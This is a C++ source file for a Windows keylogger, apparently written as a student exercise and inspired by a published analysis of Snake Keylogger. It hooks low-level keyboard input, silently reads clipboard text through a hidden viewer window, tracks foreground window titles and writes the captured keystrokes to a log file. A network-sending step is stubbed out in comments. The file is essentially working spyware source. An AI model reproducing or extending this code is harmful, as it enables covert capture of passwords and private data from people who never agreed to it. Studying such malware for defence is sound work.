/*
	Inspiration from https://www.fortinet.com/blog/threat-research/deep-dive-into-a-fresh-variant-of-snake-keylogger-malware
*/

#define _CRT_SECURE_NO_WARNINGS
#define no_init_all
#include <iostream>
#include <Windows.h>
#include <tchar.h>
#include <strsafe.h>
#include <future>

//#include "sender.h" // networking operations

#define PATH	L"C:\\Users\\student\\Desktop\\dump.log" // File path for the keylogger's output
#define DELAY	10000 // Delay in ms for the main thread
#define BUFF_SIZE 1024 // Buffer size for storing the pressed keys

VOID LogClipboardData(VOID);

int counter;
HHOOK hHook;
WCHAR buffer[BUFF_SIZE];
HWND hWndNextViewer = nullptr;
LRESULT CALLBACK ClipboardViewerProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);

// Keyboard hook callback function
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	LPKBDLLHOOKSTRUCT kInfo = (LPKBDLLHOOKSTRUCT)lParam;
	/*
		GetKLeyNameText argument 0 requires a 64 bit value containing the scan code and flags;
		We need to shift these two values in the high-order part, plus 1 to avoid negative values.
		-----------------------------------------------------------------------------------------
		1. kInfo->scanCode: This is the scan code of the key that was pressed or released. The scan code is a hardware-specific code that uniquely identifies a key on the keyboard.
		2. kInfo->flags: This represents the extended-key flag. It indicates whether the key is an extended key (such as the right-hand ALT and CTRL keys).
		3. << is the bitwise left shift operator. In this context, it is used to shift the bits of kInfo->scanCode and kInfo->flags to specific positions.
		4. The resulting values are combined to create a 32-bit message identifier (msg). The structure of the message identifier is as follows:
			The lowest 16 bits (bits 0-15) are set to 1.
			The next 8 bits (bits 16-23) contain the shifted value of kInfo->scanCode.
			The highest 8 bits (bits 24-31) contain the shifted value of kInfo->flags.
		This combination is done to ensure that the resulting msg is a 32-bit value where each part (1, scan code, flags) is in a specific position within the 32 bits.
		This msg is then passed as an argument to the GetKeyNameTextW function, which retrieves a string that represents the name of the key associated with the specified key code and extended-key flag.	
	*/
	LONG msg = 1 + (kInfo->scanCode << 16) + (kInfo->flags << 24);
	DWORD vkCode = kInfo->vkCode;
	wchar_t keyName[64];
	GetKeyNameTextW((LONG)msg, keyName, sizeof keyName);

	switch (wParam)
	{
		case WM_KEYDOWN:
			//if (wcslen(buffer) < BUFF_SIZE)
			wcscat(buffer, keyName);
			/*else if (wcslen(buffer) == BUFF_SIZE)
			{
				// 2. Write to file
				wcscat(buffer, keyName);
				FILE *output;
				errno_t err = _wfopen_s(&output, PATH, L"a");
				if (err != 0)
				{
					printf("Error opening file: %d\n", GetLastError());
					return 0;
				}
				else
				{
					printf("Buffer %ls\n", buffer);
					fwprintf_s(output, buffer);
					fclose(output);
					wmemset(buffer, 0, BUFF_SIZE);
				}
			}*/

		std::wcout << "Captured: " << keyName << std::endl;
		break;
	}

	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// Keylogger thread function
DWORD WINAPI keylogger( LPVOID lpParam )
{
	// keylogging operations
	printf("Starting keylogging..\n");
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
	while (GetMessageA(0, 0, 0, 0)); // Used to create an infinite loop that continously retrieves and dispatches messages from the message queue. The goal is to keep the thread running and processing messages
	
	return 0;
}

DWORD WINAPI LogForegroundWindow(LPVOID lpParam)
{
	HWND currentWnd = nullptr;
	while (true)
	{
		HWND newWnd = GetForegroundWindow();
		
		if (newWnd != currentWnd)
		{
			currentWnd = newWnd;
			wchar_t title[MAX_PATH];
			GetWindowTextW(currentWnd, title, MAX_PATH);
			if (title != nullptr)
				std::wcout << "Foreground window changed. Title: " << title << std::endl;

		}
	
		Sleep(1000);
	}
}

LRESULT CALLBACK ClipboardViewerProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
	switch (message) {
	case WM_DRAWCLIPBOARD:
		// Clipboard content changed
		std::cout << "Clipboard content changed" << std::endl;

		// Perform clipboard operations here
		if (OpenClipboard(hWnd)) {
			HANDLE hClipboardData = GetClipboardData(CF_TEXT);

			if (hClipboardData != nullptr) {
				char* clipboardText = static_cast<char*>(GlobalLock(hClipboardData));
				if (clipboardText != nullptr && strlen(clipboardText) > 0) {
					std::cout << "Clipboard Text: " << clipboardText << std::endl;
					GlobalUnlock(hClipboardData);
				}
			}

			CloseClipboard();
		}

		// Forward the message to the next viewer in the chain
		SendMessage(hWndNextViewer, message, wParam, lParam);
		break;

	case WM_CHANGECBCHAIN:
		// The next viewer's window handle is being removed
		if (reinterpret_cast<HWND>(wParam) == hWndNextViewer) {
			hWndNextViewer = reinterpret_cast<HWND>(lParam);
		}
		else if (hWndNextViewer != nullptr) {
			// Forward the message to the next viewer in the chain
			SendMessage(hWndNextViewer, message, wParam, lParam);
		}
		break;

	default:
		// Process other messages
		return DefWindowProc(hWnd, message, wParam, lParam);
	}

	return 0;
}

DWORD WINAPI LogClipboardData(LPVOID lpParam)
{
	// Register a window class for the clipboard viewer
	WNDCLASS wc = {};
	wc.lpfnWndProc = ClipboardViewerProc;
	wc.hInstance = GetModuleHandle(nullptr);
	wc.lpszClassName = L"ClipboardViewerClass";
	RegisterClass(&wc);

	// Create a window for the clipboard viewer (invisible)
	HWND hWndViewer = CreateWindowEx(0, L"ClipboardViewerClass", L"Clipboard Viewer", 0, 0, 0, 0, 0, HWND_MESSAGE, nullptr, nullptr, nullptr);

	// Set the viewer in the clipboard viewer chain
	hWndNextViewer = SetClipboardViewer(hWndViewer);

	// Run the message loop for this thread
	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// Remove the viewer from the clipboard viewer chain
	ChangeClipboardChain(hWndViewer, hWndNextViewer);

	return 1;
}

int main()
{
	DWORD dwThreadId;
	HANDLE hThread, foregroundThread, clipboardThread;

	// 1. Thread that logs the clipboard data
	clipboardThread = CreateThread(NULL, 0, LogClipboardData, NULL, 0, &dwThreadId);
	if (clipboardThread == NULL)
	{
		std::cout << "CreateThread failed: " << GetLastError() << std::endl;
		ExitProcess(1);
	}

	// 2. Thread that logs the foreground window
	foregroundThread = CreateThread(NULL, 0, LogForegroundWindow, NULL, 0, &dwThreadId);
	if (foregroundThread == NULL)
	{
		std::cout << "CreateThread failed: " << GetLastError() << std::endl;
		ExitProcess(1);
	}

	// 3. Thread that performs keylogging operations
	hThread = CreateThread(NULL, 0, keylogger, NULL, 0, &dwThreadId);
	if (hThread == NULL)
	{
		std::cout << "CreateThread failed: " << GetLastError() << std::endl;
		ExitProcess(1);
	}

	// 4. Wait for the threads and cleanup
	WaitForSingleObject(hThread, DELAY);
	WaitForSingleObject(foregroundThread, DELAY);
	WaitForSingleObject(clipboardThread, DELAY);
	CloseHandle(hThread);
	CloseHandle(foregroundThread);
	CloseHandle(clipboardThread);
	UnhookWindowsHookEx(hHook);
	
	// 5. Write data in output file
	FILE *output;
	errno_t err = _wfopen_s(&output, PATH, L"a");
	if (err != 0)
	{
		printf("Error opening file: %d\n", GetLastError());
		return 0;
	}
	else
	{
		fwprintf_s(output, buffer);
		fclose(output);
		wmemset(buffer, 0, BUFF_SIZE);
	}

	// 5. Send data
	//send_data();

	return 0;
}